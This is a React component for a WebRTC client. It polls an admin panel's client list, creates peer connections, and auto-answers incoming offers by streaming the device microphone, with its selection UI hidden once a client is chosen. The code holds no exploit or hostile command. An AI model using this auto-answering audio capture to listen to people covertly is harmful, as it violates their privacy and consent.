import React, { useState, useEffect, useRef } from "react";
import { notifyUser } from "../Helper/WindowsNotification";
import WebRTCManager from "../Helper/WebRTCManager";
import { toast } from "react-toastify";
import { getClients, updateAnswer } from "../Helper/Requests";

const ClientConfig = () => {
  const [clients, setClients] = useState([]);
  const [selectedClient, setSelectedClient] = useState(
    localStorage.getItem("selectedClientId") || ""
  );
  const [cd, Scd] = useState();
  const [peerStatus, setPeerStatus] = useState();
  const peerRef = useRef(null);
  const lastSdpRef = useRef(null);
  const creatingPeerRef = useRef(false); // <-- prevent duplicate peers
  const autoAnsweringRef = useRef(false); // <-- prevent duplicate answers

  const createPeerForUser = () => {
    if (creatingPeerRef.current) return;
    creatingPeerRef.current = true;

    if (peerRef.current) {
      peerRef.current.close();
      peerRef.current.destroy?.();
      peerRef.current = null;
    }

    const newPeer = new WebRTCManager();
    newPeer.createPeer(true);
    peerRef.current = newPeer;

    toast.success("Peer created successfully!");
    creatingPeerRef.current = false;
  };

  const deletePeerForUser = () => {
    if (peerRef.current) {
      try {
        peerRef.current.close();
        peerRef.current.destroy?.();
        peerRef.current = null;
        return true;
      } catch (err) {
        console.error(err);
        return false;
      }
    }
    return false;
  };

  const showStatusForPeer = () => {
    if (!peerRef.current) return;
    try {
      const status = peerRef.current.getStatus();
      setPeerStatus(status);
    } catch (err) {
      console.error("Error getting peer status:", err);
    }
  };

  const fetch_clients = async () => {
    try {
      const clientList = await getClients();
      const temp = await Promise.all(
        clientList.client_ids.map((cid) => getClients(cid))
      );
      setClients(temp);

      if (!selectedClient) return;

      const clientObj = temp.find((c) => Object.keys(c)[0] === selectedClient);
      if (!clientObj) {
        // client removed
        toast.warn("Selected client removed.");
        setSelectedClient("");
        Scd(null);
        deletePeerForUser();
        localStorage.removeItem("selectedClientId");
        return;
      }

      const clientData = clientObj[selectedClient];
      const localState = peerStatus?.peerConnectionState;
      const serverState = clientData?.status;

      const badStates = ["new", "disconnected", "failed", "closed", undefined];

      // create peer only if needed
      if (
        (!peerRef.current || badStates.includes(localState) || serverState === "disconnected" || serverState === "failed") &&
        !creatingPeerRef.current
      ) {
        createPeerForUser();
      }

      // auto-answer
      if (
        clientData.sdp &&
        clientData.ice?.length > 0 &&
        localState !== "connected" &&
        localState !== "connecting" &&
        !autoAnsweringRef.current &&
        lastSdpRef.current !== clientData.sdp
      ) {
        lastSdpRef.current = clientData.sdp;
        Scd(clientData);
        handleAutoAnswer(clientData);
      }
    } catch (err) {
      console.error("Failed to fetch clients:", err);
    }
  };

  useEffect(() => {
    fetch_clients();
  }, []);

  // Auto peer status check every 10s
  useEffect(() => {
    const interval = setInterval(() => {
      showStatusForPeer();
      fetch_clients();
    }, 10000);

    return () => clearInterval(interval);
  }, [selectedClient, peerStatus]);

  const handleAutoAnswer = async (clientDetails) => {
    if (!peerRef.current || autoAnsweringRef.current) return;

    autoAnsweringRef.current = true;

    try {
      const localStream = await navigator.mediaDevices.getUserMedia({
        audio: true,
        video: false,
      });

      const ans = await peerRef.current.createAnswer(
        { type: "offer", sdp: clientDetails.sdp },
        clientDetails.ice,
        localStream
      );

      const aid = peerRef.current.iceCandidates;
      const res = await updateAnswer({
        client_id: selectedClient,
        answer_sdp: ans.sdp,
        ice: aid,
      });

      if (res.status === 200) {
        notifyUser(
          "Auto Answer",
          `Connected to ${selectedClient}`,
          "/server.png"
        );
        toast.success(`Connected to ${selectedClient}`);
      }
    } catch (err) {
      console.error("Error auto-answering:", err);
    } finally {
      autoAnsweringRef.current = false;
    }
  };

  //---------------- UI ----------------
  if (selectedClient) return null;

  return (
    <div className="p-4 max-w-md mx-auto">
      <h3 className="mb-2 font-semibold">Select Client</h3>
      {clients.length === 0 ? (
        <p className="text-gray-500">Waiting for clients from admin panel...</p>
      ) : (
        <select
          className="select select-bordered w-full mb-4"
          value={selectedClient}
          onChange={(e) => {
            const id = e.target.value;
            setSelectedClient(id);
            localStorage.setItem("selectedClientId", id);

            const clientObj = clients.find((c) => Object.keys(c)[0] === id);
            if (clientObj) Scd(clientObj[id]);

            createPeerForUser();
          }}
        >
          <option value="" disabled>
            -- Select a Client --
          </option>
          {clients.map((c, idx) => {
            const id = Object.keys(c)[0];
            return (
              <option key={idx} value={id}>
                {id}
              </option>
            );
          })}
        </select>
      )}
    </div>
  );
};

export default ClientConfig;
